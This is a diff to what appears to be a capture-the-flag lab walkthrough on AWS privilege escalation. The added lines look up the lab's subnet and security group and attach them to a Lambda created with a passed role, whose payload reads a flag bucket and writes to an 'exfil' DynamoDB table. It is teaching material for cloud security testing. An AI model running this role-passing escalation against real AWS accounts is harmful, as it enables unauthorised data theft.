@@ -87,6 +87,18 @@ cd /tmp && zip lambda_payload.zip lambda_function.py
 
 This is the core of the attack. You use `iam:PassRole` to attach the target role as the Lambda's execution role and `lambda:CreateFunction` to deploy your payload. From the moment this function exists, it has the ability to read the flag — it just needs a trigger:
 
+Hosted environments run Lambda inside an isolated VPC. Discover the lab's subnet and security group, then include them when you create the function:
+
+```bash
+SUBNET_ID=$(aws ec2 describe-subnets \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-bucket-subnet" \
+    --query 'Subnets[0].SubnetId' --output text)
+
+SG_ID=$(aws ec2 describe-security-groups \
+    --filters "Name=tag:Name,Values=pl-prod-lambda-002-to-bucket-function-sg" \
+    --query 'SecurityGroups[0].GroupId' --output text)
+```
+
 ```bash
 aws lambda create-function \
   --function-name pl-lambda-002-to-bucket-escalation-fn \
@@ -95,7 +107,8 @@ aws lambda create-function \
   --handler lambda_function.lambda_handler \
   --zip-file fileb:///tmp/lambda_payload.zip \
   --timeout 30 \
-  --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"
+  --environment "Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}" \
+  --vpc-config SubnetIds=${SUBNET_ID},SecurityGroupIds=${SG_ID}
 ```
 
 The Lambda function now exists with the target role's S3 read and DynamoDB write permissions — but it has not executed yet.
